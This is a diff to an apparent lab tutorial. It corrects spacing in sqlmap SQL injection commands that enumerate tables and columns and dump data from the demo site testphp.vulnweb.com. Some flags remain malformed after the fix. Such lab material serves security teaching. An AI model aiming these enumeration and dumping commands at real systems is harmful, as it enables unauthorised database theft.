@@ -25,18 +25,18 @@ particular database, as shown in figure
 
 
 sudo su
-sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables
 
 
 In figure 6b you can see that there are eight tables.
 8. Type the following command and press enter to list information about the column
 of a particular table, as shown in figure 7a
 
-sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -columns
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -columns
 
 9. Type the following command and press enter to dump the data from the column,
 as shown in figure 8a
 
-sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists-C aname -dump
+sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists-C aname -dump
 
 figure 8a and 8b displays the output
